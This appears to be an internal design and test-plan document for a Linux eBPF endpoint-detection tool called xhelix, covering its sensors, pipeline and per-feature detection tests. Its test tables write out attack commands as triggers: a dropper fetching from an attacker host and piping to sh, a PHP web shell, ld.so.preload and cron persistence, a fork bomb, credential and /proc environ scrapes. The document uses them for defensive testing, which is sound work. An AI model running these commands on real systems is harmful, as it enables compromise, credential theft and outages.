# xhelix — Feature Matrix, Core Architecture, and Aggressive Test Plan

**Generated:** 2026-05-22 (end-of-session inventory).
**Scope:** every "main feature" earning the label, the architecture they compose into, and a per-feature aggressive test plan designed to produce fact-based detection-rate + false-positive-rate numbers (not theoretical).

---

# Part 1 — Feature Matrix

## 1.1 Sensors (data sources)

| Feature | Maturity | Code quality | Tests | Category | LOC |
|---|---|---|---|---|---|
| eBPF sensor (23 probes: exec, connect, ptrace, capset, mprotect, BPF syscall, SSL_read uprobe, …) | Mature | Strong | Decent | DETECT | 1,165 |
| FIM (inotify + per-vhost discovery + drift baseline) | Mature | Strong | Light | DETECT | 509 |
| credbroker fangate (sealed + honey + plaintext, FAN_OPEN_PERM) | Mature | Strong | Solid | DETECT + PREVENT | 2,431 |
| procmem (deleted-binary, thread-outside-module) | Mature | Solid | Light | DETECT | 491 |
| memdiff (RWX-mapping diff via /proc/*/maps) | New (today) | Solid | Light | DETECT | 432 |
| procscrape (eBPF openat → /proc/<pid>/{environ,maps,mem,auxv}) | New (today) | Solid | Decent | DETECT | 284 + bpf |
| decoy (honey files via fanotify) | Mature | Strong | Light | DETECT | 1,017 |
| identity (SSH session tracker, login_uid) | Mature | Solid | Light | DETECT (forensics) | 388 |
| dpi (TLS ClientHello → SNI extraction) | Mature | Strong | Light | DETECT (enrichment) | 405 |
| dnsresolver (DNS observation + DGA detection) | Mature | Solid | Light | DETECT | 839 |
| netids (per-process flow IDs, packet capture) | Mature | Solid | Light | DETECT | 1,086 |
| lsmaudit (BPF LSM audit tailer) | Beta | Decent | Light | DETECT | 443 |

## 1.2 Core analytics

| Feature | Maturity | Code quality | Tests | Category | LOC |
|---|---|---|---|---|---|
| CEL rule engine (80 rules, multi-class scoring) | Mature | Strong | Decent | DETECT | 495 |
| correlator (deterministic single-goroutine, replayable) | Mature | Strong | Light | DETECT | 339 |
| autobaseline (per-host observe → seal → detect) | Mature | Strong | Decent | DETECT | 577 |
| baseline (per-binary feature aggregates, EWMA + sigma scoring) | Mature | Strong | Decent | DETECT | 1,935 |
| takeover planner (lineage scoring + ActionPlan) | Mature | Strong | Strong | DETECT + PREVENT (plans) | 830 |
| egress observer (Mode-1, per-lineage destination classification) | Mature | Strong | Solid | DETECT | 827 |
| snicheck (TLS-no-SNI bare-IP C2 detector) | New (today) | Solid | Decent | DETECT | 323 |
| beacon detector (period + jitter analysis) | Mature | Solid | Light | DETECT | 268 |
| dnsexfil detector (high-entropy / high-rate DNS) | Mature | Solid | Light | DETECT | 297 |
| threatintel (IP/CIDR feed, 4437 ranges live) | Mature | Solid | Light | DETECT | 441 |
| YARA scanner (on-exec scan of binaries) | Beta | Decent | **WEAK (0 tests)** | DETECT | 262 |
| integrity (execve-time SHA-256 check, baseline DB) | Mature | Strong | Solid | DETECT (foundation for PREVENT) | 976 |
| chain (Ed25519-signed batched evidence chain) | Mature | Strong | Solid | FORENSICS | 333 |

## 1.3 Response / prevention

| Feature | Maturity | Code quality | Tests | Category | LOC |
|---|---|---|---|---|---|
| response policy (alert → action mapping) | Beta | Decent | Light | PREVENT (wired but quiet) | 963 |
| enforce (Soak gate + PanicSwitch + Quarantine) | Beta | Decent | Light | PREVENT | 865 |
| netban (iptables/nftables ban list) | Mature | Solid | Decent | PREVENT | 516 |

## 1.4 Posture / hardening tools (read-only inspection)

| Feature | Maturity | Code quality | Tests | Category | LOC |
|---|---|---|---|---|---|
| posture procfs (sysctl + per-service systemd drop-ins) | New (today) | Strong | Decent | PREVENT (operator-applied) | ~200 |
| posture modsig (BYOVD-equivalent surface: sig_enforce + lockdown + secure boot + CAP_SYS_MODULE) | New (today) | Solid | Decent | POSTURE (read-only) | 233 |
| posture lsm (active LSM detect) | Mature | Solid | Light | POSTURE | sensor-side |
| posture vendors (Plesk/cPanel auto-detection) | Mature | Strong | Solid | POSTURE | shared |

## 1.5 Infrastructure

| Feature | Maturity | Code quality | Tests | Category |
|---|---|---|---|---|
| SQLite hot store (modernc.org/sqlite, no CGO) | Mature | Strong | Decent | INFRA |
| TUI (`xhelixctl top` — htop-style live view) | Mature | Strong | Light | OPERATOR UX |
| xhub (cmd/xhub fleet baseline hub) | Beta | Solid | Light | INFRA (optional) |
| xhelix-verify (offline chain verifier) | Mature | Strong | Solid | FORENSICS |
| xhelix-watchdog (self-respawn binary) | Mature | Solid | Light | SELF-PROTECT |
| rule engine + class_map (LOW_FALSE_POSITIVE per-rule tier) | Mature | Strong | Solid | INFRA + DETECT tuning |

---

# Part 2 — Core Architecture

## 2.1 Single-binary EDR

xhelix is one statically-linked Go binary (`CGO_ENABLED=0`, modernc.org/sqlite, no shared libraries). No agent/manager split; no daemon farm.

Three binaries ship today:
- **`xhelix`** — the daemon. Loads eBPF, runs sensors, evaluates rules, emits alerts.
- **`xhelixctl`** — operator CLI. Status, rules lint, posture, egress analytics, integrity audit, live TUI.
- **`xhelix-verify`** — standalone chain verifier. Re-walks the Ed25519-signed evidence chain offline; names the exact tampered batch.

Plus optional:
- **`xhub`** — fleet baseline hub (cross-host rare-endpoint detection).
- **`xhelix-watchdog`** — self-respawn binary that detects userspace SIGKILL of xhelix and brings it back up.
- **`xhelix-honeysh` / `xhelix-sinkhole` / `xhelix-dnspoison`** — C2 engagement primitives (parked; not auto-promoted).

## 2.2 Three-layer composition

```
┌─────────────────────────────────────────────────────────────────────┐
│ Layer 1 — SENSORS (sensors/)                                        │
│   Each implements sensors.Sensor { Name, Start(ctx, out), Stop,     │
│   Health }. Emits model.Event over a single shared channel.         │
│                                                                     │
│   eBPF (1,165 LOC, 23 probes) → ringbuf → userspace decoder         │
│   FIM (inotify) | credbroker fangate (FAN_OPEN_PERM)                │
│   procmem (/proc walk) | memdiff (/proc/*/maps diff)                │
│   procscrape (eBPF openat) | decoy (fanotify honey)                 │
│   identity (SSH) | dpi (TLS SNI) | dnsresolver (DNS)                │
│   netids (per-PID flows) | lsmaudit | memory.dmesg | heartbeat      │
└─────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────────┐
│ Layer 2 — PIPELINE (pkg/pipeline/pipeline.go ~900 LOC)              │
│   Sequential per-event handler. Enrichment + evaluation:            │
│                                                                     │
│   1. ProcTree ancestry (PID → chain) — pkg/proctree                 │
│   2. ImageCache SHA-256 — pkg/imagecache                            │
│   3. cgroup classifier — pkg/cgroupclass                            │
│   4. connstate (5-tuple flows) — pkg/connstate                      │
│   5. procscrape Enrich (cred_proc_scrape verdict)                   │
│   6. Image hash on spawn events                                     │
│   7. HotStore insert — pkg/store (SQLite, 24h, 2GB cap)             │
│   8. Chain.Add (Ed25519-signed batched evidence) — pkg/chain        │
│   9. Rule engine eval — pkg/rules (80 CEL rules)                    │
│  10. Correlator ingest — pkg/correlator (deterministic, replayable) │
│  11. YARA scan on exec — pkg/yara                                   │
│  12. Argv-shape detectors (LOLBin, revshell, shm exec, webshell)    │
│  13. Capability classifier — pkg/capwatch                           │
│  14. Container-escape classifier — pkg/contescape                   │
│  15. ptrace classifier — pkg/ptraceguard                            │
│  16. snicheck.Note (TLS no-SNI deferred check)                      │
│  17. Egress observer classify + per-lineage counters                │
│  18. AppIdent (php-fpm:vhost-X tagging)                             │
│  19. vhost correlator (HTTP-in → outbound)                          │
│  20. Beacon detector ingest                                         │
│  21. DNS-exfil detector ingest                                      │
│  22. Baseline aggregator (per-binary EWMA)                          │
│  23. Threat-intel verdict                                           │
│  24. Takeover planner score                                         │
└─────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────────┐
│ Layer 3 — RESPONSE / PERSISTENCE                                    │
│   On match: alert bus emit → response policy → enforce →            │
│   netban / quarantine / remediate. Today most actions are           │
│   alert-only; only credbroker FAN_OPEN_PERM and posture procfs      │
│   apply are live PREVENT paths.                                     │
│                                                                     │
│   Persistence:                                                      │
│   - Hot SQLite store (24h, 2GB)                                     │
│   - Chain: Ed25519-signed batched evidence                          │
│   - Cold store (optional, capped to 30d via diskwarden)             │
│                                                                     │
│   Operator UX:                                                      │
│   - xhelixctl status / top (TUI) / events / posture / rules / etc   │
│   - Web dashboard (basic)                                           │
│   - Alert sinks: stdout / file / slack / teams                      │
└─────────────────────────────────────────────────────────────────────┘
```

## 2.3 Hard constraints (from CLAUDE.md)

- **`CGO_ENABLED=0`** — always. Binary stays statically linked (`make static-check` enforces). No C deps.
- **Linux-only runtime.** Non-Linux code paths exist only so cross-builds compile cleanly.
- **Module path** `github.com/xhelix/xhelix`. Go 1.23 (go.mod), 1.22 (CI build). Avoid 1.23-only stdlib APIs.
- **License:** Apache-2.0 for Go; **eBPF C programs under `sensors/ebpf/progs/` are GPL-2.0** (kernel ABI requirement).
- **Kernel ≥ 5.15 at runtime** for eBPF. BPF LSM features need `lsm=bpf` on kernel cmdline.
- **Correlator is single-goroutine for replayability.** Don't parallelise.

## 2.4 Key architectural decisions worth knowing

| Decision | Why |
|---|---|
| Single ringbuf for all eBPF programs | One LoadCollectionSpec; userspace decode by Kind. Simpler than per-probe buffers. |
| `modernc.org/sqlite` not `mattn/go-sqlite3` | Keeps CGO out — required for static linking. |
| Deterministic correlator | Replay-from-chain must produce identical alerts. |
| `runtimeallow.Set` shared across procmem/memdiff/scoring | One allowlist file for JIT runtimes (Node, JVM, .NET, Python). |
| `class_map.yaml` per-rule tier | Tier-1 (hard invariant) → Tier-2 (strong signal) → Tier-3 (soft drift). Operator picks `severity_threshold`. |
| Soak gate for enforce mode | Action gated by N consecutive matches in M seconds — prevents fire-on-first-FP. |
| Chain mirror + offline verify | "Did anyone tamper with logs" answer; xhelix-verify is standalone, no daemon needed. |

---

# Part 3 — Aggressive Test Plan (per major feature)

**Philosophy:** every plan covers:
- **Positive cases** (legitimate behavior) — must NOT alert. Drives FP measurement.
- **Negative cases** (malicious patterns) — MUST alert. Drives TP measurement.
- **Edge / fake / spoofed cases** — designed to fool the detector. Reveals ceiling.
- **Stress** — high-volume, race, resource exhaustion.
- **Empirical measurement** — every test plan includes specific commands to run + a method to compute detection rate (TP / (TP + FN)) and false-positive rate (FP / (FP + TN)).

Each plan has a target-acceptable FP rate stated up front. Tests should be run on a **dedicated staging host that mirrors prod's vhost layout**, with traffic replayed from anonymised production captures where possible.

---

## 3.1 eBPF sensor (23 probes)

**Target FP rate:** <0.1% per-event (it's mostly raw kernel observation; FP is in downstream rules, not the sensor itself).
**Target TP rate:** ≥99% on each probe's specific event class.

### Positive cases (must not produce probe failures)

1. **24h soak** on a busy host: ≥1M ebpf.net events, ≥10K spawn events. Assert: zero `drops` counter increment, zero "skip program" messages in journal.
2. **Container churn**: `for i in {1..1000}; do docker run --rm alpine true; done`. Assert: 1000 proc_spawn + 1000 proc_exit events captured.
3. **Heavy network**: `ab -n 100000 -c 100 http://target/`. Assert: tcp_connect probe captures count ≈ 100000 ± 5%.

### Negative cases (specific probe TP)

| Probe | Trigger | Expected event | Measure |
|---|---|---|---|
| sched_process_exec | `/bin/sh -c true` | proc_spawn with image=/bin/dash | ≥99% of 1000 invocations |
| sched_process_exit | same | proc_exit | ≥99% |
| sys_enter_connect | `nc -z google.com 443` | net_connect | ≥99% |
| tcp_connect kprobe | same | net_connect (sport > 0) | ≥99% |
| sys_enter_bind | `nc -l 0.0.0.0 9999` | net_bind | ≥99% |
| sys_enter_mprotect (RWX) | C program calling `mprotect(addr, 4096, RWX)` | mprotect_rwx | ≥99% |
| __x64_sys_bpf | `bpftool prog show` | bpf_syscall | ≥99% |
| __x64_sys_ptrace | `gdb -p $$ -batch -ex quit` | ptrace event | ≥99% |
| sys_enter_capset | dropping caps via libcap | cap_set | ≥99% |
| sys_enter_unshare | `unshare -n true` | unshare | ≥99% |
| sys_enter_pivot_root | inside a container start | pivot_root | ≥95% |
| __x64_sys_finit_module | `insmod /tmp/dummy.ko` | mod_load | ≥99% |
| sys_enter_openat (procscrape) | `cat /proc/1/environ` | proc_scrape event with kind=environ | ≥99% |
| uprobe/SSL_read | `curl https://example.com` | ssl_read with http_request_line | ≥90% (heuristic) |
| kprobe/tcp_sendmsg / recvmsg | TCP flow | net_bytes events | ≥99% |

### Edge cases

- **Self-events**: xhelix's own processes must be excluded via xh_self_pid map. Run `kill -USR1 $(pgrep -o xhelix)` while watching for self-spawn events; assert 0 events from PID == xhelix.
- **Forked self**: `xhelixctl` invocations. Must not appear in spawn alerts (self_pid is xhelix only, not ctl). Verify allowlist covers ctl too.
- **Verifier rejection at boot** on unfamiliar kernel: deploy to a kernel ≤5.14 host (or a host without BTF) → expect graceful "preflight: BTF missing" warning, NOT a crash. Run on Ubuntu 22.04 + 24.04 + Debian 12 + Rocky 9 to map matrix.
- **Ringbuf overflow**: stress with `stress-ng --hdd 8` while also running the connect storm. Drops counter must increment cleanly; daemon must not OOM.
- **Probe attach race**: restart xhelix during a high-event-rate workload. Assert: no panic; first ~50ms post-restart may drop events but recovery is clean.

### Stress cases

- **`forkbomb` simulation in a cgroup**: `bash -c ':(){ :|: & };:'` for 30s in a contained cgroup. Assert: spawn rate-limit doesn't crash xhelix; events still flowing for OTHER PIDs.
- **eBPF stack-frame stress**: a contrived program that does deep syscall trees. Verifier already accepted everything; runtime stack OK.

### How to measure

1. Run all positive cases for 24h, count events in hot.db: `SELECT sensor, COUNT(*) FROM events GROUP BY sensor`.
2. Run each negative case 1000 times in a tight loop, with `xhelixctl events tail --filter "comm=<testbin>"`. Assert N events captured.
3. **Detection rate = events captured / triggers issued.**
4. **FP rate** is measured downstream (rule layer), not here.

### Honest ceiling

- The eBPF sensor is observation, not policy. It does NOT lie about what it saw. FP comes from rules misinterpreting events, not the sensor.
- Kernel BPF verifier behavior changes across versions: re-test on every kernel upgrade. Maintain a CI matrix: kernel 5.15, 5.19, 6.1, 6.6, 6.8, 6.11.

---

## 3.2 FIM (file integrity monitoring)

**Target FP rate:** <2% (some legitimate config edits will alert; tuneable via paths config).
**Target TP rate:** ≥98% on watched-path modifications.

### Positive cases

1. **Idle host 1h**: assert <5 fim events emitted (only OS scheduled jobs touching /var/log etc).
2. **`apt upgrade nginx`**: package-managed updates to /etc/nginx. Assert: events captured AND tagged `package_managed=true` (no alert promotion).
3. **`logrotate -f`** on /var/log/. Assert: events captured but not alerted (log rotation is in path-allowlist).
4. **User edits to /home/user/.bashrc**: events captured, tagged with user_uid, alerts at info severity only.

### Negative cases (must alert)

| Action | Expected rule | Severity |
|---|---|---|
| `echo "* * * * * /tmp/x" >> /etc/cron.d/persist` | `cron_new_unit` | high |
| Edit `/root/.ssh/authorized_keys` adding a new key | `ssh_authorized_keys_modified` | high |
| `echo /tmp/evil.so > /etc/ld.so.preload` | `ld_preload_modified` | critical |
| Edit `/etc/passwd` adding a UID 0 user | `passwd_uid0_added` | critical |
| New file in `/etc/sudoers.d/` | `sudoers_drop` | high |
| Drop a binary into `/usr/local/bin/` from non-package source | `unmanaged_binary_drop` | high |
| Web shell drop: `<?php system($_GET[0]); ?>` into `/var/www/vhosts/X/httpdocs/` | `php_shellish_drop` (FIM + scoring) | high |

### Edge / fake cases

- **Symlink races**: create a symlink to a watched path, then modify via the symlink. Assert: detector catches at the inode, not the link (fanotify operates on inodes).
- **Mount-overlay tricks**: bind-mount /tmp over /etc temporarily. Assert: FIM logs the mount event (eBPF) AND any subsequent modifications.
- **Atomic rename swaps**: `mv /tmp/evil /etc/ld.so.preload`. Assert: caught (rename triggers IN_MOVED_TO).
- **Race against package manager**: simultaneous `apt upgrade` + adversarial edit. Assert: package edits are properly tagged; adversarial edit alerts even if interleaved.

### Stress

- **Mass churn**: `for i in {1..10000}; do touch /tmp/f$i; done`. /tmp isn't watched by default; assert FIM doesn't drown.
- **Watch-table exhaustion**: configure 100k watched paths, restart. Assert clean startup or graceful "FIM watch-limit reached" warning.

### Empirical measurement

1. **Detection rate**: run each negative case 100 times across 5 different hosts (clean Ubuntu, Plesk Ubuntu, Debian, Rocky, Alpine). Count alerts in hot.db.
2. **FP rate**: 24h on a busy Plesk box with normal admin activity. Count non-suppressed fim alerts; correlate with operator-known-legitimate changes.

### Honest ceiling

- Inotify can be defeated by an attacker with root who unmounts the watched FS and remounts. Pair with `posture lsm` and integrity SHA baseline.
- Per-vhost discovery (P-AB.8) covers Plesk path structure; non-Plesk LAMP hosts may miss vhost-specific .htaccess / wp-config drops.

---

## 3.3 credbroker fangate (sealed + honey + plaintext)

**Target FP rate:**
- Sealed mode: <0.01% (by construction — only marked .sealed files; only fires on opens; opens of these files are rare).
- Honey mode: 0% by construction (honey files have no legitimate reader).
- Plaintext mode: **target <5% in detect mode** after allowlist tuning; **<0.5% in enforce mode** (allowlisted readers excluded).

**Target TP rate:** ≥99% for sealed denies, ≥99% for honey touches, ≥98% for plaintext reads.

### Positive cases (detect mode — must NOT alert)

1. **aws-cli normal use**: `aws s3 ls` reading `~/.aws/credentials` → silent (aws is allowlisted).
2. **sshd normal startup** reading host keys → silent (sshd allowlisted).
3. **monit health probe** reading `/etc/psa/.psa.shadow` via plesksrv → silent IF plesksrv-class comms allowlisted.
4. **Backup job** reading credential files: ADD `restic`/`borg` to operator's extra_reader_comms allowlist; verify silent after.

### Negative cases (must alert)

| Scenario | Expected alert |
|---|---|
| `cat /root/.aws/credentials` from a shell | `credbroker.plaintext_read`, severity warn |
| `php -r 'echo file_get_contents("/var/www/vhosts/X/httpdocs/.env");'` from php-fpm | `credbroker.plaintext_read_from_webserver`, high |
| `/tmp/exfil-tool` reading `~/.npmrc` | `credbroker.plaintext_read_from_tmp`, critical |
| Adversarial process opening a `.sealed` file without contract | `credbroker.unauthentic_open`, critical |
| Touch of a honey file (decoy) | `credbroker.honey_touched`, critical |

### Edge / fake cases

- **Allowlist evasion via comm spoofing**: an attacker `prctl(PR_SET_NAME, "aws")` then reads. Mitigation: lineage check (path-of-image, not just comm). Test: spawn a process that PR_SET_NAMEs to "aws" but image is `/tmp/x`; assert plaintext alert STILL fires.
- **FD inheritance**: process A (allowlisted) opens credential file, passes FD to process B (not allowlisted) via unix-socket. Assert: fangate doesn't catch this (known limitation — fanotify intercepts open, not read-via-inherited-FD). Document as named residual.
- **Race window**: between mark-time and process start, can the attacker open the file? Yes if the attacker started before xhelix. Assert: post-restart sweep re-marks; running attacker holds an FD but new opens still gated.
- **mount-bind to a different name**: attacker bind-mounts `~/.aws/credentials` to `/tmp/c` then reads `/tmp/c`. Assert: fanotify still fires on the inode (mounts share inode); /tmp not watched but original path's mark still applies.
- **`memfd_create`-based credential storage**: attacker stores secret in memfd, no file on disk. Fangate has nothing to mark — orthogonal class. Document residual.

### Stress

- **High open rate**: `for i in {1..10000}; do cat /etc/ssh/ssh_host_rsa_key > /dev/null; done`. Detect mode silent (sshd-like reader). Then switch reader to `cat`; expect 10000 alerts. Measure overhead.
- **Many marked files**: mark 5000 plaintext paths via globs. Verify FanotifyMark per-mount limits not hit.

### Empirical measurement

1. **FP rate (detect mode)**: 24h on prod with default allowlist. Count `credbroker.plaintext_read` events grouped by reader comm. Manually tag each comm as legit/suspect. FP = suspect-tagged / total.
2. **TP rate**: scripted attack: `for i in {1..100}; do cat /root/.aws/credentials >/dev/null; done` from a non-allowlisted reader. Expect 100 alerts.
3. **Enforce-mode regression test**: in a sandbox, flip enforce=true. Run aws-cli ×100 (legit) and curl ×100 (non-allowlisted). Assert: 0 aws denies, 100 curl denies.

### Honest ceiling

- **CAP_SYS_ADMIN root attacker can FanotifyMark-remove or unmount the watched filesystem.** Same-host root remains cost-raised, not blocked.
- **FD inheritance bypass** named above.
- Allowlist tuning effort: each new operator host needs ~1 hour of triage to extend `extra_reader_comms`.

---

## 3.4 procmem (deleted-binary + thread-outside-module)

**Target FP rate:** <1% (JIT allowlist tuned).
**Target TP rate:** ≥85% on deleted-binary, ≥75% on thread-outside-module (sliver/cobalt-strike beacons).

### Positive cases (must not alert)

1. **Active JIT**: launch `node`, `java`, `python3`, `dotnet` long-running services. Wait 5min. Assert: zero procmem alerts (runtime-allowlist covers).
2. **Normal package update**: `apt upgrade` includes binaries being replaced while old processes still run. Assert: alerts emitted but at info severity (expected after upgrade); auto-suppressed via the autobaseline.

### Negative cases

| Scenario | Expected |
|---|---|
| `curl https://attacker/payload \| sh -c 'rm $0; exec /tmp/payload'` simulating a self-deleting dropper | `procmem.deleted_binary_running` event within 60s |
| Inject shellcode into a process via `process_vm_writev` (test harness) | `procmem.thread_outside_module` event within 60s |
| `memfd_create` + `fexecve` of an in-memory ELF, then `unlink` of the original binary | both alerts fire |

### Edge / fake cases

- **JIT mis-allowlist**: a custom JIT (e.g. v8 in an unusual path) firing. Add to allowlist; verify silent. Test that EVERY path glob is honoured.
- **Race between scan ticks**: a process that lives <60s. Detect rate drops to ~50% (60s tick interval). Document: this is the named ceiling — short-lived implants escape periodic-scan detectors. Eat the cost or shorten interval at CPU expense.
- **Thread RIP in [stack]**: stack is anonymous-executable on some kernels for trampolines. JIT allowlist should cover; if not, this is a known FP source. Tune.

### Stress

- **High PID count**: spawn 5000 short-lived processes. procmem scan must complete in <100ms; lastFindings counter must be sane.
- **Memory pressure**: under low free RAM, the /proc walk should not stall the daemon.

### Empirical measurement

1. **Detection rate**: run the 3 specific attacks above, each 50 times across different host load conditions. Count alerts.
2. **FP rate**: 72h soak on a host running Node/Java/Python workloads + a Plesk panel. Count alerts; investigate every one.
3. **Latency-to-detect**: median time from attack-launched to alert-fired. Target: <120s (2 ticks).

### Honest ceiling

- 60s tick window is the floor for the "loader stayed deleted long enough to detect" case. An implant that deletes and re-creates the binary within 60s evades.
- Thread-RIP-in-anon-page check is robust for naive loaders; sophisticated ones that fixup RIP back to a file-backed page evade.

---

## 3.5 memdiff (RWX-mapping diff via /proc/*/maps)

**Target FP rate:** <3% after JIT allowlist tuning + 30s grace.
**Target TP rate:** ≥80% on reflective loaders that persist >120s.

### Positive cases

1. **Steady-state Plesk host 24h**: zero memdiff alerts expected (already verified today).
2. **`node` long-running service**: V8 may create RWX regions. Assert: JIT allowlist suppresses; zero alerts.
3. **`java -jar`**: JVM creates anon RWX for JIT. Same — allowlist suppresses.

### Negative cases

| Scenario | Expected |
|---|---|
| C program: `mprotect(mmap_anon, 4096, RWX)` after 30s grace from spawn | `mem_new_rwx_mapping` event |
| Cobalt-strike-class loader simulator (Sliver beacon shellcode injected into a long-running process) | `mem_new_rwx_mapping_in_webserver` (if injected into php-fpm) |
| Reflective ELF loader: maps an ELF blob into anon-exec memory inside a long-running daemon | `mem_new_rwx_mapping` |
| `process_vm_writev` injection: external process writes shellcode into target's heap then calls mprotect | event fires on target's PID |

### Edge cases

- **JIT in unusual path**: V8 inside an Electron app in `/opt/`. Update runtimeallow; verify silent.
- **Process exits between ticks**: 90s implant. Half the time it'll be caught (second tick after appearance), half it'll miss (PID gone before tick 2). Measure empirically.
- **Many small RWX regions**: a single process creating 100 small anon-RWX maps. Detector should report each as a finding; rule severity should NOT escalate per-region (the LINEAGE is the threat, not the count).

### Stress

- **Many PIDs**: 1000 PIDs each with stable maps. Tick time should stay <200ms.
- **Maps file size**: a process with 10000 mappings. Parsing must not OOM.

### Empirical measurement

1. **TP rate**: run each attack ×100 with a 5min hold time (well past 60s tick). Count alerts.
2. **FP rate**: 72h on a host running Node + Java + Python + Plesk. Investigate every alert.
3. **Latency**: median time from anon-exec region appearance to alert. Target: <120s (2 tick boundaries).

### Honest ceiling

- Short-lived implants (<60s) frequently missed.
- Doesn't read region contents — paired with YARA-on-suspicious-lineage would dramatically tighten verdicts.

---

## 3.6 procscrape (eBPF openat → /proc/<pid>/{environ,maps,mem,auxv})

**Target FP rate:** <1% on detection mode after allowlist tuning (most hosts will need a small comm list extension).
**Target TP rate:** ≥99% — the kernel hook is observation; misses only happen if the BPF prog is rejected.

### Positive cases

1. **Self-reads** (`cat /proc/self/environ` from same PID): silent — same-PID check.
2. **`ps`, `htop`, `top`, `monit`, `journalctl`**: silent — allowlisted.
3. **xhelix's own /proc reads**: silent — xhelix in allowlist.

### Negative cases

| Scenario | Expected |
|---|---|
| `cat /proc/1/environ` from a shell | `cred_proc_scrape=true` event, comm=cat, target_pid=1, scrape_kind=environ |
| `for p in $(ls /proc/[0-9]*); do cat $p/environ 2>/dev/null; done` (mass scrape) | N events; `cred_proc_scrape_environ_burst` fires |
| Webshell: `php -r '$h=opendir("/proc"); while(...) cat /proc/$pid/environ;'` from php-fpm | events with parent_comm=php-fpm + lineage_chain to nginx/apache |
| Inspection from `/tmp/exfil` | events with image=/tmp/exfil |

### Edge / fake cases

- **Comm spoofing**: `prctl(PR_SET_NAME, "htop")` then scrape. Assert: image path NOT matching htop's path; rule fires anyway because allowlist also checks image. Test both comm-only and image-only allowlists.
- **/proc/self/* reads from a non-self target (using a magic link `/proc/self/cwd/../<pid>/...`)**: assert hook still parses the resolved path correctly via the kernel-supplied uname.
- **High-PID systems**: a host with 5-digit PIDs; the bounded path parse must still match `/environ` suffix correctly. Already verified live.

### Stress

- **High openat rate**: `strace -e openat -f apt update` produces thousands of openat. Detector must not panic; per-event CPU <1µs.
- **Verifier regression on kernel upgrade**: re-run after every kernel bump (see Part 2.3 matrix).

### Empirical measurement

1. **TP rate**: 100 deliberate `cat /proc/$pid/environ` from a non-allowlisted reader. Count alerts.
2. **FP rate** (allowlisted): 24h on prod with normal admin activity. Count alerts; categorize. Expected: a small handful of imunify/monit-class entries flag as "needs allowlist extension."
3. **Bypass attempt log**: try every comm/image spoofing trick; document any that succeed.

### Honest ceiling

- A root attacker can disable the eBPF program load entirely by killing xhelix (caught by watchdog) or unloading via bpftool (requires CAP_BPF or CAP_SYS_ADMIN — game over class).
- Allowlist-by-comm is spoofable; allowlist-by-image is path-spoofable via bind-mounts. The defense is composition with A1 sysctl hardening (prevent same-UID cross-PID reads at the kernel).

---

## 3.7 decoy / honey files

**Target FP rate:** 0% by construction (no legitimate reader of a honey file).
**Target TP rate:** ≥99% on any open.

### Positive cases

1. **Idle host with honey files planted**: zero alerts over any window. ANY alert is suspicious.
2. **Backup software touching honey**: don't plant honey in backup-paths. If a backup tool legitimately reads them, REMOVE them from that path.

### Negative cases

| Scenario | Expected |
|---|---|
| `cat /root/.aws/credentials.honey` from any process | `credbroker.honey_touched`, critical |
| `find / -name "credentials*" -exec cat {} \;` (a stupid attacker grep) | honey touches fire for every honey file matched |
| `tar -czf /tmp/exfil.tar.gz /root/` (broad exfil) | every honey file in /root/ fires |

### Edge cases

- **Honey marker in flight**: if the honey credential is exfiltrated and later USED (e.g. attacker tries `aws s3 ls` with the honey AWS key), the marker IOC should fire on the outbound HTTPS traffic. Test: plant a honey AWS access key, exfiltrate via curl, then have an out-of-band sensor see the marker in payload. Roadmap C6.
- **Honey within sealed directory**: order matters — sealed-mode handler should not pre-empt honey-mode handler if both modes are set on same path (test path-mode storage uniqueness).

### Stress

- **1000 honey files**: ensure fanotify mark count survives kernel limits.

### Empirical measurement

1. **TP rate**: any operator on the live host who accidentally `cat`s a honey file MUST produce an alert. Measure post-deployment by intentionally `cat`-ing each honey from a non-allowlisted shell.
2. **FP rate**: 0 expected. Any non-zero count = honey is planted in a path that has a legitimate reader.

### Honest ceiling

- Sophisticated attackers don't `cat` random files. They run `find ~/.aws -name credentials` (specific). Honey at predictable paths catches the broad-grep adversary; targeted attackers (who already know what files to take) will see the honey, notice it's atypical content, and skip it. Hence honey is a TRIPWIRE for low-skill / mass attacks; high-skill attackers get past it.

---

## 3.8 integrity (execve-time SHA-256 + baseline DB)

**Target FP rate:** <1% (after first-day baseline build).
**Target TP rate:** ≥99% on any unknown-binary execve.

### Positive cases

1. **First-day baseline**: 2000-3000 binaries SHA'd. Subsequent execves match. Assert: 0 alerts after baseline completes.
2. **`apt upgrade`**: package replaces binaries. Integrity baseline auto-refreshes via the "authentic upgrade" T1-T5 test policy. Assert: alerts emitted but tagged `authentic_upgrade=true`; rule promotion suppressed.
3. **`pip install --user xyz`**: drops binaries in `~/.local/bin/`. Whether to alert is policy — these are user-installed; tag with `user_installed=true`; don't critical-alert.

### Negative cases

| Scenario | Expected |
|---|---|
| `cp /tmp/bpfdoorpoc /usr/local/bin/x && /usr/local/bin/x` | unknown-binary alert AT execve time |
| Drop a binary into `/tmp` and execute | `integrity.unknown_binary` + `binary_runs_from_tmp` (compound) |
| Modify `/bin/ls` in place (overwrite with malicious) and run it | SHA mismatch alert at NEXT execve of /bin/ls |
| Container image with embedded malicious binary, run it | unknown-binary at first exec (container runtime + image SHA mismatch) |

### Edge / fake cases

- **Authentic-upgrade race**: simultaneously modify a binary AND `apt upgrade` the package. T1-T5 should still catch the adversarial edit (T4 SHA validation against the package's expected SHA fails).
- **Setuid baseline drift**: a new setuid binary appears that's NOT in the suid-baseline. Roadmap item B5.
- **Cached vs live SHA**: two execves in <1ms of the same binary — must use cached SHA, not re-compute, but cache must invalidate on file mtime change.

### Stress

- **Cold-start with 10K binaries**: baseline build should complete in <2 minutes (was <1s for 2314 on plesk).
- **High execve rate**: `for i in {1..1000}; do /bin/true; done`. Per-exec overhead <500µs.

### Empirical measurement

1. **TP rate**: 100 deliberate unknown-binary execs. Count alerts.
2. **FP rate**: 7-day soak after baseline. Count alerts; investigate each. Expect: every alert traces to a real package update, user install, or legit operator action.
3. **Cache-hit ratio**: should be >95% on normal workloads.

### Honest ceiling

- Detect-only today; enforce mode is ~half day's work (already substrate-complete in pkg/integrity).
- Doesn't cover script payloads (sh, py, php) — those run via interpreters; the integrity baseline catches the interpreter, not the script.

---

## 3.9 CEL rule engine + correlator

**Target FP rate:** <1% per-rule for Tier-1 rules; <5% for Tier-2; Tier-3 expected to be noisy by design.
**Target TP rate:** per-rule, varies. Aggregated correlator multi-signal alerts target ≥95% TP / ≤2% FP.

### Positive cases

1. **`xhelixctl rules lint`** at every commit: 80/80 must compile.
